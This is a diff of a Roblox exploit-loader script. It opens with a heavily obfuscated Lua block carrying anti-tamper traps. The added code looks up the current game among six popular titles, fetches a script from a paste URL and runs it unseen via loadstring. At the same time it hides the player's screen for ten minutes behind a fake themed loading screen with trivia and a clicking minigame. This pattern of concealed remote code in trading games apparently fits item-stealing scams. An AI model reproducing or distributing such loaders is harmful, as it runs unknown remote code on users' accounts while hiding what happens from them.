@@ -1,1 +1,215 @@
---[[ obfuscated @ discord.gg/25ms --]] return(function(...)local R={"H3/ZzPW=";"QYsDqTY0lSs/5Y/AOj==";"CDUONhC=";"VBQ=","cj==","0DkiXvq=";"qkIPsb7=";"BWkxbJC=";"DRcrFSC=";"cuhd9iY=";"VRvnlr9=";"c6Ox","5Rbys6U9";"sSI2QSUK";"m2E2dk==";"QRPxQRaW";"VfOdc0Q=";"c6Py5k==";"puK7M2==";"ui+T5Z9/u+==","X88=";"7QW=";"UqTwURee4R8EjW20sj==";"obP/cfj=","tcmUKKm=","lk==";"2SQdkPj=";"","QBTW5j==","+4A=";"m9Gx0j==";"VfOWsovx7pDnQSwC365bcfUWtSPx3ZTE5oebVfA+8lXiQSvn7fOx5ZY=";"5o+=";"QoeyQf2=";"KYKrn9V=","6b/ubvV=";"cqQwdeV=";"5j==","46ebRoW=";"8nOdVED0Qo8+t6OE5lkF3j==","ZBvTspOEciD2QRaCcZyfsSIns6TLci+/VfOWsovx7zmL7faiQEvTcfj/";"c6Py5pUWVfTx52==";"llDd5SP076m+c6PW7j==","+uGP9+==","Tj==";"u+==","j6wbcfqLcpOysj==";"QRyyV+==","+LLRN+V=","HjvNAtm=";"5fwLc07=","obPd5oj=";"1SvqOW/Ie+==","Vfax56Pd","Vfax56X=","kka/mSY=","ix6nd+j="}for d,T in ipairs({{(591918-199165)-392752,103946+-103889},{254944-254943,71754+-71726};{158636+-158607;369475-(-11807-(-381225))}})do while(T)[-989156+989157]<(T)[(769374-(-221139))-990511]do(R)[(T)[-762922+762923]],(R)[(T)[-518415-(-518417)]],(T)[-954739-(-954740)],(T)[-246846-(-246848)]=(R)[(T)[(-235036+-94993)+330031]],(R)[(T)[-238513+(-558091+((1670449-(35702-(621441+-1427943)))-31640))]],(T)[-1016868-(-1016869)]+(135233+-135232),(T)[-770656+(-89048-(-859706))]-((629656-((1535157-(157319-(-530535)))-(-1098793-(-936027))))-(-380414))end end local function t(d)return(R)[d-(864023+(-355852-(10973-(-487857))))]end do local d=R local T=string.len local L=string.sub local t=table.insert local p=type local X={z=209043-209040,L=46685-(1069330-1022692);h=(498720-(-284338))-783043,q=738320-(507748-(-230552));R=21100+-21046,t=512456+-512430;f=-469709+469747,w=521306+-521257,v=-545856-(-545865);O=-748594-(-748615),["3"]=(218018-362434)+(-681777+826203);Q=934844-934820;F=306223-306165;u=-368605+(602762+-234143);e=960984+-960967;K=-724394-(-724437),k=-100988-(27691-(-775880-(-704271+(609961-810249)))),j=136136+-136120,g=-774362-(-774413),J=-180201-(-180260),G=(-635598+(122254+73347))+440008,m=-506328+(-643603+1149935),["6"]=480034+-480028;B=-701768+701807,i=305466-305432,I=742079-742022;["4"]=-383572+383591;n=-491190+491225;D=303235+-303234,N=233552-233489,C=6381+-6337,b=-414551+414604;T=-1030757-(-298617+-732177);W=173831-173779,["7"]=(65023-840280)+775265;["9"]=((1172167-860403)-528331)+216607;x=(-972578-42774)-(-1015398);V=-731363-(-731391),["/"]=-786811-((((-1217728-(-730872))-(-1352946-(-402338)))+-1062095)+-188509);p=-55889-(328670+(-929679+545113));S=809129+-809107,H=-159901-(-159932),Z=308627-308625,X=-61507-(-61567);l=326936+-326918;y=-637343+637376;o=837836+-837813;["1"]=-179964-(-179994);["0"]=633520+-633465;U=-1011557-(-1011570);r=(176324+78764)+-255046;Y=(796633+-44956)-751641;M=203132-203070;s=796695-796666;["8"]=-393521+393533,["+"]=-671721-(-671753),P=-916401-(-916462),A=-591401+591457;["5"]=(707995+-175701)-532269;["2"]=821970-821922;E=(29148-(-956089))+-985187,c=650729+-650702,d=((751752+-842535)-(-835755+305596))-439331,a=-730690-(-730695)}local w=string.char local O=math.floor local i=table.concat for R=-183630-(-183631),#d,(-911965+(460634+941010))-(5396+(768790+-284508))do local g=(d)[R]if p(g)=="string"then local p=T(g)local n={}local s=-648839-(-648840)local N=-339834-(-339834)local U=841758-(156800+(((795388+-1557628)+((627338+314370)-871890))+1377380))while s<=p do local d=L(g,s,s)local T=(X)[d]if T then N=N+T*(-884509+884573)^((854169-854166)-U)U=U+((-574949+232159)+(-508469+851260))if U==-175743+175747 then U=-861382-((408689+-1500225)-(-230154))local d=O(N/((976620-1042454)+131370))local T=O((N%(-141188-(-206724)))/(-845865+846121))local L=N%(-986507-(-986763))t(n,w(d,T,L))N=246053+-246053 end elseif d=="="then t(n,w(O(N/(-278582-(-344118)))))if s>=p or L(g,s+(930294-(43475+886818)),s+(460767+-460766))~="="then t(n,w(O((N%(-212605+(-741507-(-1019648))))/(319817-319561))))end break end s=s+(-62641-(673642-(((-459303+1444549)+-58948)-(933481+-743467))))end;(d)[R]=i(n)end end end do local d=true pcall(function()((getgenv()))[t(173009+-163657)]=function() end end)local T=(string)[t(1011447+-1002065)]local L=function()error(t(-504440-(-513795)))end local R=false local p=pcall(function()R=true end)and R local X=(math)[t(255022+-245656)]local w=(table)[t(-670417-(-711636+31834))]local O=table and(table)[t(999177+-989794)]or unpack local i=X(228433+-228430,248696-248631)local g=-423421-(-423421)local n=(549305-(-162213))+-711518 local s={pcall(function()local d=(908532+(7716324-135597))-t(-303741-(-313106))^(475149+-465695)return t(361105+-351732)/d end)}local N=(s)[358826+((409314-183925)+-584213)]local U=tonumber((T(tostring(N),t(-961145-(-970534))))())for L=53244-53243,i,(-760193-(-933586))-173392 do local R=(math)[t(-287032+296398)](-576262+576263,-603386+603486)local p=X(-946316-(-946316),-87126+87381)local w=X(-823829-(-823830),R)local s=X(396224-(58302+337921),-709204-(-709206))==-323201-(234860+-558062)local k=N:gsub(t(-585021+(851332+-256922)),t(-149194-(-158552))..(tostring(X(-286186-(302412+-588598),-776390+786390))..t(-2899-(-12257))))local B={pcall(function()if X(1018111+(356289+-1374399),-461285-(-461287))==943332+(-198257-(1321646-576572))or L==i then local L=tonumber((T(tostring((({pcall(function()local d=(17033028-(-789736+1750486))-t(-585207-(-594599))^(1022536+8786689)return t(430913+((-596514-277711)-(-452683)))/d end)}))[(-329843+881755)-551910]),t((((55696+(((-285246-(-342527-394672))+(1228109-499993))-823259))+-1028884)+615592)-(((-465693+-327441)-(-802440))+(-1009556+990075)))))())d=d and U==L end if s then error(k,-708944-(936667+-1645611))end local g={}for d=66176+-66175,R,(-424545+1012341)+-587795 do(g)[d]=X(-917172+917172,483064-482809)end;(g)[w]=p return O(g)end)}if s then d=d and((B)[(-894560+1520473)-625912]==false and(B)[-157197-(115972-273171)]==k)else d=d and(B)[-1015051-(-1015052)]g=(g+(B)[w+(-755912+(648007+107906))])%((-418371-73617)+492244)n=(n+p)%(-352409-(-773022-(-420357)))end end local k=loadstring or load or((getfenv(print)))[t(656641-647254)]or((getfenv(print)))[t(37161+-27807)]if not k then local d,T=pcall(function()return require(t(424682+-415323))end)k=T and(T)[t(-930002+939389)]end local B=true if k then local d=tonumber((T(tostring((({(k(t(-811668+821012)))()}))[((32113-(-975383))+-866141)+-141353]),t(428229+-418840)))())local L=tonumber((T(tostring((({(k(t(566380-557027)))()}))[1007772+-1007770]),t(191343-181954)))())B=d~=L end d=d and(g==n and B)local h=not d and L()if d then else repeat return(function()while true do l1,l2=l2,l1 L()end end)()until true while true do l2=X(-167902-(-167903),-61136-(-61142))if l2>336237+-336235 then l2=tostring(l1)else l1=l2 end end return end end local L=function(d)local T,L=(d)[#d],t(727234+-717837)for R=(1823670-862945)+-960724,#T,(659252-((-741795+1657692)+((363015-((-277297-(-273459))-136873))+-1040773)))+-280401 do L=L..(T)[(d)[R]]end return L end local T,d do local R=(math)[t(-422820-(-432183))]local p=(math)[L({(699309-468742)+-230565,((-872575+673160)+14388)+185028;{t(-257542+266916),t(128914+-119547)}})]local X=(table)[L({(-1087546-(-1828809-(-885205)))-(-143943),581378-581376;{t(-558006+567392),t(254530-245180)}})]local w=(string)[t(-816430+(-133316-(-959106)))]local O=((1056410-28817)-928645)+-98948 local i=134796+-134794 local g={}local n={}local s=124462+-124462 local N={}for d=(983596+-1690174)+(851461-144882),(-576341+(544893-(-652392)))+-620688,-286936+286937 do(N)[d]=d end repeat local d=p(1027314-1027313,#N)local T=X(N,d);(n)[T]=w(T-(-1037876-(-264347+((-1303922-(-325152))-(-205240)))))until#N==598493-598493 local U={}local function k()if#U==640374+-640374 then O=(O*(-71884+71897)+(-207000+19097936864321))%((-964392-(-616226))+35184372436998)repeat i=(i*(-465488-((1770627-((-19991-(-1132860-(-202848)))-17934))+-1344214)))%((-1141540-(-835469))+306328)until i~=-162711+162712 local d=i%(242510+-242478)local T=(R(O/(689813+-689811)^((-928472+(615481+313004))-(i-d)/(957177+(-732775+-224370))))%(((4295942719.0-((-428027+1373090)-190073))-942934)-(-722501)))/(-506762-(-506764))^d local p=R((T%(653497+-653496))*(196848+4294770448.0))+R(T)local X=p%(-756638-(-822174))local w=(p-X)/(787734-(1747501-1025303))local g=X%(592296+-592040)local n=(X-g)/(774005+-773749)local s=w%(-527643+(867226+-339327))local N=(w-s)/(948914+-948658)U={g;n,s;N}end return(table)[L({(-957641+217775)+(169524-(-570344)),369886+(437588+-807473),{t(392435-383085),t(847532+-838146)}})](U)end local B={}T=setmetatable({},{[L({-262-(-263),972843+-972841;{t(-475915+485308),t(637242+-627897)}})]=B;[L({-669417+669419;(-572382-(-528913))+43472;((-596812-(-357122))+-556233)+795924;{t(331704+-322354);t(-769243+778607);t(611315+-601969)}})]=nil})function d(T,L)local R=B if(R)[L]then else U={}local d=n O=L%((-403878+35184371617176)-(-875534))i=L%((-452302-(-368007))+84550)+(389442+(1042559+-1431999))local p=(string)[t(-914681-(-924062))](T);(R)[L]=t(-294976-(-304373))local X=-30766+30879 for p=((-842742-20975)+(2124738-289101))-971919,p,-781639+781640 do X=(((string)[t(618043+-608645)](T,p)+k())+X)%(883128-(-722629+1605501));(R)[L]=(R)[L]..(d)[X+(-446057+446058)]end end return L end end return(function(R,X,w,O,i,g,n,Q,h,s,U,D,p,B,N,k,...)D,p,Q,k,B,s,U,h,N=function(d,T,...)local L=B(T)local R=function(...)return p(d,{...},T,L)end return R end,function(p,w,O,i,...)local s,h,k,n,U,B,N while p do k=(T)[d(L({-699424-(-699431);-405701+405704;653637-653629;((((1278839-(-210948))-1041490)+(682473-534288))+154763)+-751243;325827-325826,(((1267744-(503760+-115952))+-1310599)-(-657983))+-227315,-374247-(-374256);976799-976795,354156+-354150,{t(4141+5236),t(-716564+((((406265+-706120)+127520)-360692)+1258963));t(826878+-817510);t(-521121-(-530483)),t((-1183995-(-588652))-(-604692));t(218317-208922),t(-225854+235205),t(43696-34321);t(217696-208335)}}),21322844222209-329417)]n=(T)[d(L({-115175-(-84012-31164),201394-201392,{t(((-514069+1332017)+156495)+(-205251+-759823));t(-998614-(-1007962))}}),73739+4919550384928)]h=(T)[d(L({300335+(165752-((96378-(-378105))+-8398)),(-234438+199511)-(7109+(-1047690+(1294684-289031)));{t(-729450-(-738792)),t((127854+((-966994+1365913)+-1273868))-(-756465))}}),-744001+25148830406573)]s=w N=(T)[d(t(553569-544226),18749634417495-(-814248+1310097))]p=(R)[n]B=true U=(R)[N]h=(U)[h]N={h(U,k,B)}n=p(X(N))p=n()n={}p=(R)[(T)[d(L({-114668+114669,147408-147405,104767+-104765;{t((71846+-64136)-(426788+(598069+-1026541))),t((-164094-(-469953))+-296503),t(-777558-(-786938))}}),-155630+7816145249965)]]end p=#i return X(n)end,function(d,...)(N)[d]=(N)[d]-(-46621+46622)if 783724+-783724==(N)[d]then(N)[d],(s)[d]=nil,nil end end,-24140-(-24140),function(R,...)for d=1046621+-1046620,#R,-748740-(-748741)do(N)[(R)[d]]=(N)[(R)[d]]+(889100+-889099)end if w then local p=w(true)local X=i(p);(X)[(T)[d(L({146864+-146863,375291-375289,{t(228798-219422);t(((301588-208295)-(-562088))+(-350980-295010))}}),-635257+(303313+8377787333154))]],(X)[(T)[d(t(-860951+(-984062+1854397)),305852+4060578579314)]],(X)[(T)[d(t(-285148-(-294526)),4249977403813-383417)]]=R,h,function(...)return 955793+2317793 end return p else return O({},{[(T)[d(t(964041+(-1902355-(-947702))),(-617222+363884)+((-315556-(-52212-(799129+104871)))+15788477841902))]]=h,[(T)[d(L({839935+-839933;-486295-((-731162+(226965+807209))+-789308),{t(613138+-603748),t(-944231+953578)}}),(977120+13966848107301)-(-652046))]]=R,[(T)[d(t(-912511-(-921907)),9140317637821-849901)]]=function(...)return 4190024-916438 end})end end,{},function(...)k=(-341830-(70325+-412156))+k;(N)[k]=-572021+572022 return k end,function(d,...)local T,L=(61872+328284)+-390155,(d)[-818546+818547]while L do(N)[L],T=(N)[L]-(471132+-471131),T+(695603-695602)if 398750-398750==(N)[L]then(N)[L],(s)[L]=nil,nil end L=(d)[T]end end,{}return(D(556912-43172,{}))(X(n))end)(getfenv and getfenv()or _ENV,unpack or(table)[(T)[d(L({-473764-(-473765),(342385-((-557575+-116160)+952022))-64096;{t(-525956+535335),t(77445-68088)}}),7618752207988-279868)]],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+-- Game info for themed loading screens
+local gameInfo = {
+    [142823291] = { -- Murder Mystery 2
+        bgColor = Color3.fromRGB(255, 0, 0),
+        title = "MURDER MYSTERY 2 🔪🩸",
+        facts = {
+            "MM2 was created by Nikilis in 2014.",
+            "The most expensive knife ever sold cost over 500,000 seers.",
+            "There are 3 main roles: Innocent, Sheriff, Murderer.",
+            "The game was originally called 'Murder'."
+        },
+        script = "https://paste.debian.net/plainh/4c9365af/"
+    },
+    [126884695634066] = { -- Grow A Garden
+        bgColor = Color3.fromRGB(0, 200, 0),
+        title = "GROW A GARDEN 🐶🌱",
+        facts = {
+            "You can plant seeds and raise pets.",
+            "The most expensive pet costs millions of coins.",
+            "You can combine seeds to make rare plants.",
+            "Some pets boost your farming speed."
+        },
+        script = "https://paste.debian.net/plainh/1bcca30b/"
+    },
+    [8737899170] = { -- Pet Simulator 99
+        bgColor = Color3.fromRGB(0, 100, 255),
+        title = "PET SIMULATOR 99 🐾💎",
+        facts = {
+            "PS99 was released in 2023 by BIG Games.",
+            "Some pets are worth billions of gems.",
+            "Hatching eggs can give you huge pets.",
+            "Trading Plaza is where players trade rare pets."
+        },
+        script = "https://paste.debian.net/plainh/f7e3fafa/"
+    },
+    [18901165922] = { -- Pets GO
+        bgColor = Color3.fromRGB(255, 165, 0),
+        title = "PETS GO 🐕🏃",
+        facts = {
+            "Pets GO is inspired by Pet Simulator mechanics.",
+            "You can race pets to earn rewards.",
+            "Some pets can only be unlocked during events.",
+            "The game updates frequently with new worlds."
+        },
+        script = "https://paste.debian.net/plainh/b11ed528/"
+    },
+    [920587237] = { -- Adopt Me
+        bgColor = Color3.fromRGB(255, 192, 203),
+        title = "ADOPT ME 🍼🐕",
+        facts = {
+            "Adopt Me has a huge trading community.",
+            "Pets can be evolved into Neons.",
+            "You can own vehicles and houses.",
+            "Regular events drop rare pets."
+        },
+        script = "https://paste.debian.net/plainh/e1b2c69b/"
+    },
+    [2753915549] = { -- Blox Fruits
+        bgColor = Color3.fromRGB(0, 0, 0),
+        title = "BLOX FRUITS 🍉⚔️",
+        facts = {
+            "Blox Fruits has over 8 billion visits.",
+            "You can unlock powerful fruits with unique skills.",
+            "PvP battles are intense and competitive.",
+            "The game is inspired by One Piece anime."
+        },
+        script = "https://paste.debian.net/plainh/dcc899d0/"
+    }
+}
+
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
+local placeId = game.PlaceId
+local gameData = gameInfo[placeId]
+
+local function createLoadingScreen(info)
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "LoadingScreen"
+    gui.Parent = CoreGui
+    gui.IgnoreGuiInset = true
+    gui.ResetOnSpawn = false
+
+    local bg = Instance.new("Frame", gui)
+    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.BackgroundColor3 = info.bgColor
+    bg.BackgroundTransparency = 1
+    TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
+
+    local title = Instance.new("TextLabel", bg)
+    title.AnchorPoint = Vector2.new(0.5, 0.5)
+    title.Position = UDim2.new(0.5, 0, 0.5, 0)
+    title.Size = UDim2.new(0.9, 0, 0.15, 0)
+    title.BackgroundTransparency = 1
+    title.Text = info.title
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.TextScaled = false
+    title.Font = Enum.Font.GothamBlack
+    title.TextSize = 60
+
+    local fact = Instance.new("TextLabel", bg)
+    fact.AnchorPoint = Vector2.new(0.5, 0.5)
+    fact.Position = UDim2.new(0.5, 0, 0.65, 0)
+    fact.Size = UDim2.new(0.9, 0, 0.1, 0)
+    fact.BackgroundTransparency = 1
+    fact.TextColor3 = Color3.new(1, 1, 1)
+    fact.TextScaled = true
+    fact.Font = Enum.Font.GothamBold
+
+    task.spawn(function()
+        local factIndex = 1
+        while gui.Parent do
+            fact.TextTransparency = 1
+            fact.Text = info.facts[factIndex]
+            TweenService:Create(fact, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+            factIndex = (factIndex % #info.facts) + 1
+            task.wait(10)
+            TweenService:Create(fact, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
+            task.wait(0.5)
+        end
+    end)
+
+    local barFrame = Instance.new("Frame", bg)
+    barFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+    barFrame.Position = UDim2.new(0.5, 0, 0.75, 0)
+    barFrame.Size = UDim2.new(0.8, 0, 0.05, 0)
+    barFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    barFrame.BorderSizePixel = 0
+    local barFrameUICorner = Instance.new("UICorner", barFrame)
+    barFrameUICorner.CornerRadius = UDim.new(0, 10)
+
+    local bar = Instance.new("Frame", barFrame)
+    bar.Size = UDim2.new(0, 0, 1, 0)
+    bar.BackgroundColor3 = Color3.new(1, 1, 1)
+    bar.BorderSizePixel = 0
+    local barUICorner = Instance.new("UICorner", bar)
+    barUICorner.CornerRadius = UDim.new(0, 10)
+
+    TweenService:Create(bar, TweenInfo.new(600, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()
+
+    local loadingText = Instance.new("TextLabel", bg)
+    loadingText.AnchorPoint = Vector2.new(0.5, 0)
+    loadingText.Position = UDim2.new(0.5, 0, 0.81, 0)
+    loadingText.Size = UDim2.new(0.2, 0, 0.05, 0)
+    loadingText.BackgroundTransparency = 1
+    loadingText.TextColor3 = Color3.new(1, 1, 1)
+    loadingText.TextScaled = true
+    loadingText.Font = Enum.Font.GothamBold
+    loadingText.Text = "Loading"
+
+    task.spawn(function()
+        while gui.Parent do
+            for i = 1, 3 do
+                loadingText.Text = "Loading" .. string.rep(".", i)
+                task.wait(0.5)
+            end
+            loadingText.Text = "Loading"
+            task.wait(0.5)
+        end
+    end)
+
+    local emojis = {"🎯", "🔪", "🌱", "🐶", "💎", "🏃", "🩸", "🐾", "🍉", "⚔️", "🐱", "🍼"}
+    local emoji = Instance.new("TextLabel", bg)
+    emoji.Text = emojis[math.random(#emojis)]
+    emoji.TextScaled = true
+    emoji.Font = Enum.Font.GothamBlack
+    emoji.Size = UDim2.new(0.1, 0, 0.1, 0)
+    emoji.AnchorPoint = Vector2.new(0.5, 0.5)
+    emoji.Position = UDim2.new(math.random() * 0.8 + 0.1, 0, math.random() * 0.5 + 0.1, 0)
+    emoji.BackgroundTransparency = 1
+    emoji.ZIndex = 10
+    emoji.Active = true
+    emoji.Selectable = true
+
+    local score = 0
+    local scoreLabel = Instance.new("TextLabel", bg)
+    scoreLabel.AnchorPoint = Vector2.new(0.5, 0)
+    scoreLabel.Position = UDim2.new(0.5, 0, 0.9, 0)
+    scoreLabel.Size = UDim2.new(0.3, 0, 0.05, 0)
+    scoreLabel.BackgroundTransparency = 1
+    scoreLabel.TextColor3 = Color3.new(1, 1, 1)
+    scoreLabel.TextScaled = true
+    scoreLabel.Font = Enum.Font.GothamBold
+    scoreLabel.Text = "Score: 0"
+
+    local function moveEmoji()
+        emoji.Text = emojis[math.random(#emojis)]
+        emoji.Position = UDim2.new(math.random() * 0.8 + 0.1, 0, math.random() * 0.5 + 0.1, 0)
+    end
+
+    local function onEmojiClicked(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            score = score + 1
+            scoreLabel.Text = "Score: " .. score
+            moveEmoji()
+        end
+    end
+
+    emoji.InputBegan:Connect(onEmojiClicked)
+
+    -- Fade out after 10 minutes
+    task.delay(600, function()
+        TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
+        task.wait(1)
+        gui:Destroy()
+    end)
+end
+
+if gameData then
+    task.spawn(function()
+        loadstring(game:HttpGet(gameData.script, true))()
+    end)
+    createLoadingScreen(gameData)
+else
+    warn("[Loader] No script for this game.")
+end
